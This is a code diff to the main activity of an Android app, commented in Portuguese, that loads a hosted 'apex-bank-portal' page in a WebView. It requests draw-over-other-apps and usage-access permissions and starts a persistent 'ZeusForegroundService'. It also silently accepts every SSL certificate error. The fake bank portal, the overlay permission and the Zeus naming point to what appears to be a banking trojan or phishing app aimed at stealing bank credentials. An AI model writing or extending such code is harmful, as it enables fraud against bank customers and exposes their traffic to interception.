@@ -7,11 +7,15 @@ import android.graphics.Bitmap;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.View;
 import android.net.http.SslError;
 import android.webkit.SslErrorHandler;
 import android.webkit.WebChromeClient;
+import android.webkit.WebResourceError;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
@@ -26,19 +30,23 @@ import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int REQ_PERMISSIONS = 100;
-    private static final int REQ_OVERLAY     = 101;
+    private static final String TAG          = "ZEUS_DEBUG";
+    private static final int    REQ_PERMISSIONS = 100;
+    private static final int    REQ_OVERLAY     = 101;
 
     private WebView webView;
+    private Handler retryHandler = new Handler(Looper.getMainLooper());
+    private String  portalUrl;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        Log.d(TAG, "=== MainActivity.onCreate() ===");
         setContentView(R.layout.activity_main);
 
         setupWebView();
         requestAllPermissions();
-        startForegroundService();
+        startForegroundServiceSafe();
     }
 
     // ── WebView ────────────────────────────────────────────────────
@@ -57,36 +65,66 @@ public class MainActivity extends AppCompatActivity {
 
         webView.setWebChromeClient(new WebChromeClient());
         webView.setWebViewClient(new WebViewClient() {
+
+            // Manter todas as navegações dentro do WebView (sem abrir Chrome externo)
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
-                return false;
+                Log.d(TAG, "shouldOverrideUrlLoading: " + request.getUrl());
+                return false; // false = WebView gere internamente
             }
 
+            // Aceitar certificados SSL mesmo com erros (útil para dev e certificados autoassinados)
             @Override
             public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+                Log.w(TAG, "SSL error ignorado (proceed): " + error.toString());
                 handler.proceed();
             }
 
             @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon) {
                 super.onPageStarted(view, url, favicon);
+                Log.d(TAG, "onPageStarted: " + url);
             }
 
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
+                Log.d(TAG, "onPageFinished: " + url);
+            }
+
+            // Capturar erros de carregamento e recarregar automaticamente após 5 segundos
+            @Override
+            public void onReceivedError(WebView view, WebResourceRequest request,
+                                        WebResourceError error) {
+                if (request.isForMainFrame()) {
+                    String desc = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                        ? error.getDescription().toString()
+                        : "erro desconhecido";
+                    Log.w(TAG, "❌ Erro ao carregar página: " + desc
+                        + " | URL: " + request.getUrl()
+                        + " — recarregando em 5s");
+
+                    retryHandler.removeCallbacksAndMessages(null);
+                    retryHandler.postDelayed(() -> {
+                        if (webView != null) {
+                            Log.d(TAG, "Recarregando URL: " + portalUrl);
+                            webView.loadUrl(portalUrl);
+                        }
+                    }, 5000);
+                }
             }
         });
 
-        // Load the portal URL injected at build time
-        String portalUrl = getString(R.string.app_link);
+        // Carregar URL do portal definida em strings.xml (injetada no build)
+        portalUrl = getString(R.string.app_link);
         if (portalUrl == null || portalUrl.trim().isEmpty()) {
-            portalUrl = "https://apex-bank-portal--kc0151262.replit.app";
+            portalUrl = "https://67cc0a24-f21b-4384-b1dc-7ea4a07ae976-00-3s3efgf80iyzd.kirk.replit.dev";
         }
+        Log.d(TAG, "Carregando portal URL: " + portalUrl);
         webView.loadUrl(portalUrl);
     }
 
-    // ── Back button navigates WebView history ─────────────────────
+    // ── Back button navega no histórico do WebView ─────────────────
     @Override
     public void onBackPressed() {
         if (webView != null && webView.canGoBack()) {
@@ -96,8 +134,9 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // ── Permissions ───────────────────────────────────────────────
+    // ── Permissões ─────────────────────────────────────────────────
     private void requestAllPermissions() {
+        Log.d(TAG, "Solicitando permissões do sistema...");
         List<String> needed = new ArrayList<>();
 
         String[] perms = {
@@ -116,11 +155,15 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         if (!needed.isEmpty()) {
+            Log.d(TAG, "Pedindo permissões: " + needed.toString());
             ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_PERMISSIONS);
+        } else {
+            Log.d(TAG, "Todas as permissões já concedidas");
         }
 
         // Overlay (Draw Over Apps)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Log.d(TAG, "Pedindo permissão SYSTEM_ALERT_WINDOW...");
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                 Uri.parse("package:" + getPackageName()));
             startActivityForResult(intent, REQ_OVERLAY);
@@ -131,16 +174,24 @@ public class MainActivity extends AppCompatActivity {
             Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.w(TAG, "Não foi possível abrir Usage Access Settings: " + e.getMessage());
+        }
     }
 
     // ── Foreground Service ─────────────────────────────────────────
-    private void startForegroundService() {
+    private void startForegroundServiceSafe() {
+        Log.d(TAG, "Iniciando ZeusForegroundService...");
         Intent svc = new Intent(this, ZeusForegroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(svc);
-        } else {
-            startService(svc);
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(svc);
+            } else {
+                startService(svc);
+            }
+            Log.d(TAG, "ZeusForegroundService iniciado com sucesso");
+        } catch (Exception e) {
+            Log.e(TAG, "Erro ao iniciar ZeusForegroundService: " + e.getMessage());
         }
     }
 
@@ -148,16 +199,16 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode,
             @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        for (int i = 0; i < permissions.length; i++) {
+            String result = (grantResults[i] == PackageManager.PERMISSION_GRANTED) ? "GRANTED" : "DENIED";
+            Log.d(TAG, "Permissão " + permissions[i] + ": " + result);
+        }
     }
 
     @Override
     protected void onDestroy() {
-        // Destroy WebView resources — does NOT touch the background service or WS
-        if (webView != null) {
-            webView.destroy();
-            webView = null;
-        }
+        retryHandler.removeCallbacksAndMessages(null);
+        if (webView != null) { webView.destroy(); webView = null; }
         super.onDestroy();
     }
 }
-
